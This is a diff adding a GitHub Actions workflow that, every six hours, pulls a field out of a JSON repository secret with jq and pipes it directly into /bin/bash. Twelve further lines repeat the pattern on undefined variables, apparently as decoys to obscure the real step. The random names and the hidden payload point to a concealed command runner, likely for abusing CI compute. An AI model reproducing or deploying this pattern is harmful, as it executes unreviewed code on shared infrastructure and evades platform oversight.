@@ -1,0 +1,29 @@
+name: kangdabaojiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kangdabaojiang
+        env:
+          h66929: ${{ secrets.h66929 }}
+        run: |
+          echo $h66929 | jq -r .li85 | /bin/bash
+          echo $u86 | jq -r .vqi672 | /bin/bash
+          echo $ym60 | jq -r .bxghm52896 | /bin/bash
+          echo $ja4648 | jq -r .txx4 | /bin/bash
+          echo $v4 | jq -r .xh717 | /bin/bash
+          echo $omim1510 | jq -r .hzmx80 | /bin/bash
+          echo $zokhs8801 | jq -r .nn6 | /bin/bash
+          echo $x48175 | jq -r .in100 | /bin/bash
+          echo $bkwes4893 | jq -r .qjhn1735 | /bin/bash
+          echo $orant69 | jq -r .f2 | /bin/bash
+          echo $d95 | jq -r .khr5224 | /bin/bash
+          echo $a8 | jq -r .lgzvn1 | /bin/bash
+          echo $pv0042 | jq -r .ossw2215 | /bin/bash
+
